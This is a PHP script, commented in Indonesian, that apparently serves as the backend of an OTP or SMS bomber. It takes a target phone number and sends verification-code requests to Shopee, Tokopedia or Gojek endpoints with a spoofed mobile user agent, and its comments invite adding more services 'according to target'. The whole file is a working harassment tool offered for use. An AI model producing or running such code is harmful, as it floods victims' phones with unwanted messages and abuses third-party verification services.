<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = json_decode(file_get_contents('php://input'), true);
$nomor = preg_replace('/[^0-9]/', '', $data['nomor'] ?? '');

if (strlen($nomor) < 10) {
    echo json_encode(['status' => 'fail', 'msg' => 'Nomor invalid']);
    exit;
}

// Daftar endpoint OTP yang sering dipakai (update sesuai target)
$layanan = [
    'shopee' => [
        'url' => 'https://shopee.co.id/api/v4/otp/send',
        'method' => 'POST',
        'body' => json_encode(['phone' => $nomor, 'operation' => 1])
    ],
    'tokopedia' => [
        'url' => 'https://www.tokopedia.com/api/otp/send',
        'method' => 'POST',
        'body' => json_encode(['msisdn' => $nomor])
    ],
    'gojek' => [
        'url' => 'https://api.gojekapi.com/v5/customers',
        'method' => 'POST',
        'body' => json_encode(['phone' => '+62' . substr($nomor, 1)])
    ],
    // tambahkan Dana, OVO, Grab, dll
];

$target = array_rand($layanan);
$cfg = $layanan[$target];

$ch = curl_init($cfg['url']);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => $cfg['method'],
    CURLOPT_POSTFIELDS => $cfg['body'],
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
    ],
    CURLOPT_TIMEOUT => 10
]);

$response = curl_exec($ch);
$http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http >= 200 && $http < 300) {
    echo json_encode(['status' => 'success', 'layanan' => $target]);
} else {
    echo json_encode(['status' => 'fail', 'msg' => 'Gagal kirim', 'layanan' => $target]);
}
